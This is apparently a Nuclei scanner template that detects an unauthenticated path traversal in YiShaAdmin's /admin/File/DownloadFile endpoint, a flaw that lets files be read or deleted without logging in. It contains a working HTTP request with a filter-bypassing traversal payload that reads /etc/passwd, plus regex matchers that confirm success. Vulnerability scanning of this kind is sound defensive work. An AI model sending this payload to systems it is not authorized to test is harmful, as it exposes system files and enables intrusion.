id: yishaadmin-lfi
info:
  author: Evan Rubinstein
  description: An endpoint in yshaadmin "/admin/File/DownloadFile" was improperly
    secured, allowing for files to be downloaded, read or deleted without any authentication.
  name: yishaadmin path traversal
  reference:
  - https://huntr.dev/bounties/2acdd87a-12bd-4ce4-994b-0081eb908128/
  - https://github.com/liukuo362573/YiShaAdmin/blob/master/YiSha.Util/YiSha.Util/FileHelper.cs#L181-L186
  severity: high
  tags: lfi,yishaadmin
requests:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0
    HTTP/1.1

    Host: {{Hostname}}

    '
